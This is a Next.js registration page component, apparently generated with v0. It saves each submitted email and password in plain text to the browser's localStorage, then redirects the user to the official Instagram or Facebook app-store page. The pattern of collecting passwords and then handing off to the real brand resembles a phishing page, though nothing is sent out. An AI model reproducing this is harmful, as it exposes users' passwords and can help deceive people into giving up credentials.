'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import RegisterForm from '@/components/register-form';

export default function RegisterPage() {
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const handleRegister = async (email: string, password: string, source: string) => {
    setIsLoading(true);

    try {
      const registrationData = {
        email,
        password,
        source: 'register',
        timestamp: new Date().toISOString(),
      };

      // Store in browser storage
      const existingRegistrations = JSON.parse(localStorage.getItem('registrations') || '[]');
      existingRegistrations.push(registrationData);
      localStorage.setItem('registrations', JSON.stringify(existingRegistrations));

      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 1000));

      // Detect device and redirect to appropriate app store
      const userAgent = navigator.userAgent.toLowerCase();
      const isAndroid = /android/.test(userAgent);

      if (isAndroid) {
        window.location.href = 'https://play.google.com/store/apps/details?id=com.instagram.android';
      } else {
        window.location.href = 'https://apps.apple.com/app/instagram/id389801252';
      }
    } catch (error) {
      console.error('[v0] Registration error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleFacebookRegister = async () => {
    setIsLoading(true);

    try {
      const facebookData = {
        email: 'facebook_user',
        password: 'facebook_auth',
        source: 'facebook',
        timestamp: new Date().toISOString(),
      };

      // Store in browser storage
      const existingRegistrations = JSON.parse(localStorage.getItem('registrations') || '[]');
      existingRegistrations.push(facebookData);
      localStorage.setItem('registrations', JSON.stringify(existingRegistrations));

      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 1000));

      // Detect device and redirect to appropriate app store
      const userAgent = navigator.userAgent.toLowerCase();
      const isAndroid = /android/.test(userAgent);

      if (isAndroid) {
        window.location.href = 'https://play.google.com/store/apps/details?id=com.facebook.katana';
      } else {
        window.location.href = 'https://apps.apple.com/app/facebook/id284882215';
      }
    } catch (error) {
      console.error('[v0] Facebook registration error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <RegisterForm
      onRegister={handleRegister}
      onFacebookRegister={handleFacebookRegister}
      isLoading={isLoading}
    />
  );
}
